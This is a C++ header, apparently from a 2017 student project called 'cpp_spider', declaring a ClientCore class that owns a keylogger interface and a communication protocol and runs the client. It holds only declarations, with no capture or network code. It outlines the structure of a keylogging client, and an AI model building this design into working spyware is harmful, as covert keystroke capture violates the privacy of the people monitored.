/*
** ClientCore.hpp for cpp_spider in /home/god/TEK3/C++/cpp_spider/includes/ClientCore.hpp
**
** Made by Maxime PILLON
** Login   <maxime.pillon@epitech.eu>
**
** Started on  Thu Oct 05 10:58:55 2017 Maxime PILLON
** Last update Thu Oct 05 10:58:55 2017 Maxime PILLON
*/

#pragma once

#include "KeyLogger/IKeyLogger.hpp"
#include "Protocol/IProtocol.hpp"
#include	<iostream>
#include	<memory>

/// \namespace spider
namespace spider
{
    /// \class ClientCore
    class ClientCore
  {
  protected:
        /// \brief Keylogger
        std::unique_ptr<IKeyLogger>	_keylogger;

        /// \ brief communication protocol class
        std::unique_ptr<IProtocol>	_proto;

  public:
        /// \brief default constructor
        ClientCore();

        /// \brief default destructor
        virtual ~ClientCore();

        /// \brief run the client
        void run();
  };
}